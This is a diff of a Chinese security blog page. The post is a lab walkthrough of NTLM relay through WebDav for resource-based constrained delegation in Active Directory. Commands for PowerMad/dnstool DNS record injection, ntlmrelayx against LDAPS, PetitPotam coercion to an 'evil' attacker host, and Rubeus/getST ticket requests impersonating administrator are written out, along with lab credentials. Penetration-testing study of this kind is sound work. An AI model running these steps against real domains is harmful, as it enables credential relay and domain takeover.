@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言：​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端">
+  <meta name="description" content="0x1 前言​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过WebDav进行NTLM Relay">
 <meta property="og:url" content="http://antipassion.github.io/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/index.html">
 <meta property="og:site_name" content="林中小屋">
-<meta property="og:description" content="前言：​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端">
+<meta property="og:description" content="0x1 前言​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png">
 <meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144213123.png">
 <meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png">
 <meta property="article:published_time" content="2022-10-30T02:51:43.000Z">
-<meta property="article:modified_time" content="2022-11-20T03:20:41.551Z">
+<meta property="article:modified_time" content="2023-04-11T09:32:53.002Z">
 <meta property="article:author" content="Nayon">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
@@ -213,7 +213,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-20 11:20:41" itemprop="dateModified" datetime="2022-11-20T11:20:41+08:00">2022-11-20</time>
+                <time title="修改时间：2023-04-11 17:32:53" itemprop="dateModified" datetime="2023-04-11T17:32:53+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -243,13 +243,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap/s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？</p>
+        <h3 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h3><p>​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap/s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？</p>
 <p>​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端不支持签名验证的话，服务端在与客户端通信时是不会强制要求签名认证的。因此我们可以使用HTTP服务中的WebDav来尝试Relay攻击了。</p>
 <span id="more"></span>
 
-<h3 id="什么是WebDav"><a href="#什么是WebDav" class="headerlink" title="什么是WebDav:"></a>什么是WebDav:</h3><p>​    WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV  就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。</p>
+<h3 id="0x2-什么是WebDav"><a href="#0x2-什么是WebDav" class="headerlink" title="0x2 什么是WebDav"></a>0x2 什么是WebDav</h3><p>​    WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV  就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。</p>
 <p>​    Windows通过WebClient服务实现WebDav，允许Windows程序通过WebDav来创建、读取以及写入服务器上的文件，并通过HTTP服务进行通信，在客户端访问WebDav时，若开启Windows身份验证机制，我们便可以通过域内凭证进行访问服务。</p>
-<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤:"></a>攻击步骤:</h3><ul>
+<h3 id="0x3-攻击步骤"><a href="#0x3-攻击步骤" class="headerlink" title="0x3 攻击步骤"></a>0x3 攻击步骤</h3><ul>
 <li>拿到一枚域用户</li>
 <li>探测开启WebDav的服务器</li>
 <li>在域内为攻击机添加DNS解析</li>
@@ -257,10 +257,10 @@
 <li>强制WebDav服务器认证攻击机</li>
 <li>执行基于资源的约束委派攻击</li>
 </ul>
-<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h3><h4 id="探测WebDav服务"><a href="#探测WebDav服务" class="headerlink" title="探测WebDav服务"></a>探测WebDav服务</h4><p>​    拿到域内权限后，通过<code>GetWebDAVStatus.exe</code>探测内网中开放WebDav的服务器。</p>
+<h3 id="0x4-攻击流程"><a href="#0x4-攻击流程" class="headerlink" title="0x4 攻击流程"></a>0x4 攻击流程</h3><h4 id="0x01-探测WebDav服务"><a href="#0x01-探测WebDav服务" class="headerlink" title="0x01 探测WebDav服务"></a>0x01 探测WebDav服务</h4><p>​    拿到域内权限后，通过<code>GetWebDAVStatus.exe</code>探测内网中开放WebDav的服务器。</p>
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png" alt="image-20221030124101717"></p>
 <p>​    发现目标后，为了让Relay顺利进行，我们可以添加一份DNS A记录，从而使得WebDav通过默认凭据来对我们进行身份验证，由于在Windows当中，WebDav由WebClient服务实现，而WebClient服务仅对内网以及受信任站点中的目标来采用默认凭据进行身份验证。</p>
-<h4 id="添加DNS解析"><a href="#添加DNS解析" class="headerlink" title="添加DNS解析"></a>添加DNS解析</h4><h5 id="0x1-域内使用PowerMad添加"><a href="#0x1-域内使用PowerMad添加" class="headerlink" title="0x1.域内使用PowerMad添加"></a>0x1.域内使用PowerMad添加</h5><p>此处我们使用PowerMad进行添加DNS A解析记录，此处我们添加解析记录，普通域用户也可添加，并非只有域管用户才可操作。</p>
+<h4 id="0x02-添加DNS解析"><a href="#0x02-添加DNS解析" class="headerlink" title="0x02 添加DNS解析"></a>0x02 添加DNS解析</h4><h5 id="0x1-域内使用PowerMad添加"><a href="#0x1-域内使用PowerMad添加" class="headerlink" title="0x1.域内使用PowerMad添加"></a>0x1.域内使用PowerMad添加</h5><p>此处我们使用PowerMad进行添加DNS A解析记录，此处我们添加解析记录，普通域用户也可添加，并非只有域管用户才可操作。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\<span class="built_in">invoke-DNSupdate</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-DNSUpdate</span> <span class="literal">-DNSType</span> A <span class="literal">-DNSName</span> evil.pentest.local <span class="literal">-DNSData</span> <span class="number">10.0</span>.<span class="number">10.128</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png" alt="image-20221030124859446"></p>
@@ -269,12 +269,12 @@
 <h5 id="0x2-域外使用dnstool-py添加"><a href="#0x2-域外使用dnstool-py添加" class="headerlink" title="0x2.域外使用dnstool.py添加"></a>0x2.域外使用dnstool.py添加</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u pentest.local\\Sharp -p Admin<span class="comment">#123 -r evil.pentest.local -d 10.0.10.128 --action add ws01.pentest.local</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151117006.png" alt="image-20221030151117006"></p>
-<h4 id="准备NTLM-Relay"><a href="#准备NTLM-Relay" class="headerlink" title="准备NTLM Relay"></a>准备NTLM Relay</h4><p>回到攻击机进行操作。</p>
+<h4 id="0x03-准备NTLM-Relay"><a href="#0x03-准备NTLM-Relay" class="headerlink" title="0x03 准备NTLM Relay"></a>0x03 准备NTLM Relay</h4><p>回到攻击机进行操作。</p>
 <p>利用Impacket项目<code>ntlmrelayx.py</code>执行攻击，指定LDAP协议进行身份验证，目标主机设置为域控，利用-delegate-access选项执行基于资源的约束委派攻击。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldaps://ws01 --delegate-access -smb2support</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030130628768.png" alt="image-20221030130628768"></p>
-<h4 id="强制认证主机创建机器账户"><a href="#强制认证主机创建机器账户" class="headerlink" title="强制认证主机创建机器账户"></a>强制认证主机创建机器账户</h4><p>回到被我们控制的主机，使用PetitPotam 强制WebDav服务器认证我们的攻击机，此处不可使用ip进行强制认证，使用我们先前添加的DNS解析进行强制认证,此处的<code>@</code>符号前为主机名，后为端口号。</p>
+<h4 id="0x04-强制认证主机创建机器账户"><a href="#0x04-强制认证主机创建机器账户" class="headerlink" title="0x04 强制认证主机创建机器账户"></a>0x04 强制认证主机创建机器账户</h4><p>回到被我们控制的主机，使用PetitPotam 强制WebDav服务器认证我们的攻击机，此处不可使用ip进行强制认证，使用我们先前添加的DNS解析进行强制认证,此处的<code>@</code>符号前为主机名，后为端口号。</p>
 <h5 id="0x1-域内认证"><a href="#0x1-域内认证" class="headerlink" title="0x1.域内认证"></a>0x1.域内认证</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe evil@<span class="number">80</span>/evil.cnf <span class="number">10.0</span>.<span class="number">10.110</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030131357379.png" alt="image-20221030131357379"></p>
@@ -286,7 +286,7 @@
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132543523.png" alt="image-20221030132543523"></p>
 <p>这时我们回到域控查看WebDav服务器，可以发现<code>msDS-KeyCredentialLink</code> 属性已经被修改。</p>
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132832081.png" alt="image-20221030132832081"></p>
-<h4 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h4><h5 id="0x1-域内申请票据"><a href="#0x1-域内申请票据" class="headerlink" title="0x1.域内申请票据"></a>0x1.域内申请票据</h5><p>此时，我们便可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p>
+<h4 id="0x05-申请票据"><a href="#0x05-申请票据" class="headerlink" title="0x05 申请票据"></a>0x05 申请票据</h4><h5 id="0x1-域内申请票据"><a href="#0x1-域内申请票据" class="headerlink" title="0x1.域内申请票据"></a>0x1.域内申请票据</h5><p>此时，我们便可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p>
 <p>将密码转为hash，便于我们进行使用Rubeus进行申请票据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /domain:pentest.local /user:RUVEPAFW$ /password:&#x27;gm9wPzATZ&lt;RT5Ei&#x27;</span><br></pre></td></tr></table></figure>
 
@@ -307,6 +307,8 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.0.10.111 pentest/RUVEPAFW\$ -spn cifs/ws03.pentest.local -impersonate administrator</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png" alt="image-20221030153948639"></p>
+<h3 id="0x5-参考文章"><a href="#0x5-参考文章" class="headerlink" title="0x5 参考文章"></a>0x5 参考文章</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.thehacker.recipes/ad/movement/mitm-<span class="keyword">and</span>-coerced-authentications/webclient</span><br><span class="line">https:<span class="regexp">//</span>www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -390,7 +392,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFWebDav"><span class="nav-number">2.</span> <span class="nav-text">什么是WebDav:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.</span> <span class="nav-text">攻击步骤:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">攻击流程:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8BWebDav%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.1.</span> <span class="nav-text">探测WebDav服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0DNS%E8%A7%A3%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">添加DNS解析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E4%BD%BF%E7%94%A8PowerMad%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.1.</span> <span class="nav-text">0x1.域内使用PowerMad添加</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E4%BD%BF%E7%94%A8dnstool-py%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.2.</span> <span class="nav-text">0x2.域外使用dnstool.py添加</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%86%E5%A4%87NTLM-Relay"><span class="nav-number">4.3.</span> <span class="nav-text">准备NTLM Relay</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81%E4%B8%BB%E6%9C%BA%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">4.4.</span> <span class="nav-text">强制认证主机创建机器账户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.1.</span> <span class="nav-text">0x1.域内认证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.2.</span> <span class="nav-text">0x2.域外认证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.</span> <span class="nav-text">申请票据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.1.</span> <span class="nav-text">0x1.域内申请票据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.2.</span> <span class="nav-text">0x2.域外申请票据</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x1 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E4%BB%80%E4%B9%88%E6%98%AFWebDav"><span class="nav-number">2.</span> <span class="nav-text">0x2 什么是WebDav</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.</span> <span class="nav-text">0x3 攻击步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">0x4 攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E6%8E%A2%E6%B5%8BWebDav%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.1.</span> <span class="nav-text">0x01 探测WebDav服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E6%B7%BB%E5%8A%A0DNS%E8%A7%A3%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 添加DNS解析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E4%BD%BF%E7%94%A8PowerMad%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.1.</span> <span class="nav-text">0x1.域内使用PowerMad添加</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E4%BD%BF%E7%94%A8dnstool-py%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.2.</span> <span class="nav-text">0x2.域外使用dnstool.py添加</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-%E5%87%86%E5%A4%87NTLM-Relay"><span class="nav-number">4.3.</span> <span class="nav-text">0x03 准备NTLM Relay</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81%E4%B8%BB%E6%9C%BA%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">4.4.</span> <span class="nav-text">0x04 强制认证主机创建机器账户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.1.</span> <span class="nav-text">0x1.域内认证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.2.</span> <span class="nav-text">0x2.域外认证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.</span> <span class="nav-text">0x05 申请票据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.1.</span> <span class="nav-text">0x1.域内申请票据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.2.</span> <span class="nav-text">0x2.域外申请票据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">5.</span> <span class="nav-text">0x5 参考文章</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -406,20 +408,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -462,7 +464,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
